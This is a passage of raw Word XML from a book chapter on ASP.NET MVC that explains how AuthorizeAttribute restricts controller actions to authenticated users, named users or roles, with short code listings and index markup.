          <w:rPrChange w:id="21" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Authorize</w:instrText>
      </w:r>
      <w:ins w:id="22" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="004D5449">
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                    #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRPr="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5449">
        <w:t>public ActionResult About()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRPr="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5449">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRPr="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5449">
        <w:tab/>
        <w:t>return View();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="00EC5FDA">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5449">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009574DB" w:rsidRDefault="009574DB" w:rsidP="009574DB">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> applied to About action</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00307203" w:rsidRDefault="00307203" w:rsidP="00307203">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When this action is requested by an unauthenticated user, the </w:t>
      </w:r>
      <w:r w:rsidRPr="00307203">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will prevent access to it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3368B" w:rsidRDefault="00B3368B" w:rsidP="00B3368B">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1.2 Requiring authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00307203" w:rsidRPr="00307203" w:rsidRDefault="00307203" w:rsidP="00307203">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>To restrict a</w:t>
      </w:r>
      <w:r w:rsidR="00BD149B">
        <w:t xml:space="preserve">n action further, developers can specify users or roles that the </w:t>
      </w:r>
      <w:r w:rsidR="00BD149B" w:rsidRPr="00BD149B">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00BD149B">
        <w:t xml:space="preserve"> requires. These roles or users are passed to the attribute using a comma-delimited list of strings - either the usernames or the roles allowed. Listing 11.2 shows the </w:t>
      </w:r>
      <w:r w:rsidR="00BD149B" w:rsidRPr="003C4522">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="00BD149B">
        <w:t xml:space="preserve"> syntax for requiring a specific user.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.2 User authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>[Authorize</w:t>
      </w:r>
      <w:ins w:id="23" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="004B5146">
        <w:rPr>
          <w:rPrChange w:id="24" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Authorize</w:instrText>
      </w:r>
      <w:ins w:id="25" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00BD149B">
        <w:t>(Users = "admin")]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>public ActionResult Admins()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:tab/>
        <w:t>return View();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 Users property requires specific users</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Hard</w:t>
      </w:r>
      <w:r w:rsidR="00D05479">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">coding a username like this may be too tightly controlling.  Users come and go and the duties of a given user may change during their time using the application.  Instead of </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">requiring a specific user it usually makes sense to require a role.  Listing 11.3 demonstrates how </w:t>
      </w:r>
      <w:r w:rsidR="00D05479">
        <w:t xml:space="preserve">developers </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">can use the </w:t>
      </w:r>
      <w:r w:rsidR="00705E20" w:rsidRPr="00705E20">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to restrict an action to certain roles.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.3 Role authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>[Authorize</w:t>
      </w:r>
      <w:ins w:id="26" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="004B5146">
        <w:rPr>
          <w:rPrChange w:id="27" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Authorize</w:instrText>
      </w:r>
      <w:ins w:id="28" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00BD149B">
        <w:t>(Roles = "admins, developers")]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  #1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>public ActionResult Developers()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRPr="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:tab/>
        <w:t>return View();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00BD149B">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRDefault="00BD149B" w:rsidP="00BD149B">
      <w:pPr>
        <w:pStyle w:val="CodeAnnotation"/>
      </w:pPr>
      <w:r>
        <w:t>#1 Multiple roles are comma delimited</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD149B" w:rsidRDefault="00006618" w:rsidP="00CF2AEE">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Access to t</w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE" w:rsidRPr="00CF2AEE">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>Developers</w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve"> action will only be allowed to users in the </w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE" w:rsidRPr="00CF2AEE">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>admins</w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE" w:rsidRPr="00CF2AEE">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>developers</w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve"> roles - all other users (authenticated or not) will be issued a </w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE" w:rsidRPr="00CF2AEE">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>401</w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve"> response code and using ASP.NET's forms authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve">, redirected to the login page. Now that we've seen a few examples of how the </w:t>
      </w:r>
      <w:r w:rsidR="00CF2AEE" w:rsidRPr="00CF2AEE">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00CF2AEE">
        <w:t xml:space="preserve"> is used, let's talk about how it works.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002921BB" w:rsidRDefault="002921BB" w:rsidP="002921BB">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1.3 AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - how it works</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002921BB" w:rsidRDefault="002921BB" w:rsidP="005524D4">
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> checks the </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>IPrincipal</w:t>
      </w:r>
      <w:ins w:id="29" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="001672F9">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="30" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>IPrincipal</w:instrText>
      </w:r>
      <w:ins w:id="31" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> associated with the current </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>HttpContext</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. When </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>Users</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>Roles</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is specified, it ensures the </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>IPrincipal</w:t>
      </w:r>
      <w:r>
        <w:t>'s username is in the allowed usernames, or a member of one of the granted roles.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002921BB" w:rsidRDefault="005524D4" w:rsidP="002921BB">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is applied to a controller, it is applied to every action in that controller.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005524D4" w:rsidRDefault="005524D4" w:rsidP="002921BB">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If multiple </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthrorizeAttributes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are applied to an action, all checks occur and the user must be authorized by all of them.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF2AEE" w:rsidRPr="00CF2AEE" w:rsidRDefault="00020104" w:rsidP="002921BB">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> implements a special interface called </w:t>
      </w:r>
      <w:r w:rsidRPr="005524D4">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>IAuthorizationFilter</w:t>
      </w:r>
      <w:ins w:id="32" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D655A5">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="33" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>IAuthorizationFilter</w:instrText>
      </w:r>
      <w:ins w:id="34" w:author="Jeffrey" w:date="2010-03-15T16:29:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
